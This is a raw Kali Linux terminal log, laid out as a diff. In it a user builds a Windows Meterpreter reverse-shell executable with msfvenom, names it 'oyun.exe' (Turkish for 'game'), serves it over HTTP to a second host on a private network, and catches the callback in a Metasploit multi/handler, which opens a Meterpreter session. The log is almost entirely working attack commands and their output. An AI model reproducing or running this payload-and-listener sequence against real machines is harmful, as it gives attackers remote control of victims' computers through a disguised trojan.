@@ -1,0 +1,135 @@
+─(kali㉿kali)-[~]
+└─$ la 
+.bash_logout  .bashrc.original  .config  .dmrc      Downloads  .face.icon  .ICEauthority  .local    .msf4  Pictures  Public     Videos       .xsession-errors      .zprofile     .zshrc
+.bashrc       .cache            Desktop  Documents  .face      .gnupg      .java          .mozilla  Music  .profile  Templates  .Xauthority  .xsession-errors.old  .zsh_history
+                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ cd Desktop
+                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ldd
+ldd: missing file arguments
+Try `ldd --help' for more information.
+                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ls 
+                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.248.128  netmask 255.255.255.0  broadcast 192.168.248.255
+        inet6 fe80::c1e4:ff12:75e5:5b4b  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:04:b9:fe  txqueuelen 1000  (Ethernet)
+        RX packets 4667  bytes 392644 (383.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7387  bytes 472080 (461.0 KiB)
+        TX errors 0  dropped 6 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 480 (480.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.248.128 LPORT=4444 -f exe > oyun.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop]
+└─$ python -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.248.130 - - [15/Jan/2025 07:25:21] "GET / HTTP/1.1" 200 -
+192.168.248.130 - - [15/Jan/2025 07:25:22] code 404, message File not found
+192.168.248.130 - - [15/Jan/2025 07:25:22] "GET /favicon.ico HTTP/1.1" 404 -
+192.168.248.130 - - [15/Jan/2025 07:26:35] "GET /oyun.exe HTTP/1.1" 200 -
+192.168.248.130 - - [15/Jan/2025 07:29:11] "GET /oyun.exe HTTP/1.1" 304 -
+^M        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+192.168.248.130 - - [15/Jan/2025 07:41:37] "GET /oyun.exe HTTP/1.1" 304 -
+192.168.248.130 - - [15/Jan/2025 07:42:44] "GET /oyun.exe HTTP/1.1" 200 -
+192.168.248.130 - - [15/Jan/2025 07:48:31] "GET /oyun.exe HTTP/1.1" 304 -
+192.168.248.130 - - [15/Jan/2025 07:52:27] "GET /oyun.exe HTTP/1.1" 304 -
+192.168.248.130 - - [15/Jan/2025 08:07:15] "GET / HTTP/1.1" 200 -
+192.168.248.130 - - [15/Jan/2025 08:07:18] code 404, message File not found
+192.168.248.130 - - [15/Jan/2025 08:07:18] "GET /favicon.ico HTTP/1.1" 404 -
+192.168.248.130 - - [15/Jan/2025 08:07:22] "GET /oyun.exe HTTP/1.1" 304 -
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+(kali㉿kali)-[~]
+└─$ msfconsole 
+Metasploit tip: Writing a custom module? After editing your module, why not try 
+the reload command
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.4.34-dev                          ]
++ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]
++ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/mult
+[-] Unknown command: �use. Did you mean use? Run the help command for more details.
+msf6 > use eexploit/multi/handler
+[-] No results from search
+[-] Failed to load module: eexploit/multi/handler
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/
+Display all 292 possibilities? (y or n)
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/rever_tcp
+[-] The value specified for PAYLOAD is not valid.
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.248.129
+LHOST => 192.168.248.129
+msf6 exploit(multi/handler) > set LHOST 192.168.248.128
+LHOST => 192.168.248.128
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.248.128:4444 
+[*] Sending stage (177734 bytes) to 192.168.248.130
+[*] Meterpreter session 1 opened (192.168.248.128:4444 -> 192.168.248.130:49792) at 2025-01-15 08:07:36 -0500
+
+meterpreter > 
